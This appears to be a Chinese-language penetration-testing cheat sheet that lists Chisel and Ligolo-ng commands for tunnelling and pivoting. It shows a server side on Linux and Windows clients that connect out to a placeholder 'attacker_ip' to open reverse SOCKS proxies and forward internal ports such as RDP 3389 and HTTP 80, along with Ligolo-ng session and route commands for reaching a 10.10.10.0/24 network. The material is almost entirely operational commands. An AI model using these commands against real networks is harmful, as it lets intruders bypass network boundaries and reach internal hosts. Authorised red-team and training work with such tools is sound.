# 隧道代理

_2 条工具命令_

### Chisel  `chisel-tool`
_HTTP隧道工具_

**Step 0**
> 启动服务端
_platform: linux_
```
./chisel server -p 8000 --reverse
```

**Step 0**
> 建立反向SOCKS代理
_platform: windows_
```
chisel.exe client attacker_ip:8000 R:socks
```

**Step 0**
> 端口转发
_platform: windows_
```
chisel.exe client attacker_ip:8000 R:3389:127.0.0.1:3389
```

**Step 0**
> 建立正向SOCKS代理
_platform: windows_
```
chisel.exe client attacker_ip:8000 socks
```

**Step 0**
> 多端口转发
_platform: windows_
```
chisel.exe client attacker_ip:8000 R:80:127.0.0.1:80 R:3389:127.0.0.1:3389
```

---

### Ligolo-ng  `ligolo-tool`
_隧道工具_

**Step 0**
> 启动代理服务器
_platform: linux_
```
sudo proxy -selfcert
```

**Step 0**
> Agent连接到代理
_platform: windows_
```
agent.exe -connect attacker_ip:11601 -ignore-cert
```

**Step 0**
> 选择会话
_platform: linux_
```
session
session_select_id
```

**Step 0**
> 启动隧道
_platform: linux_
```
start_tunnel
```

**Step 0**
> 添加目标网段
_platform: linux_
```
interface_add_route 10.10.10.0/24
```

---
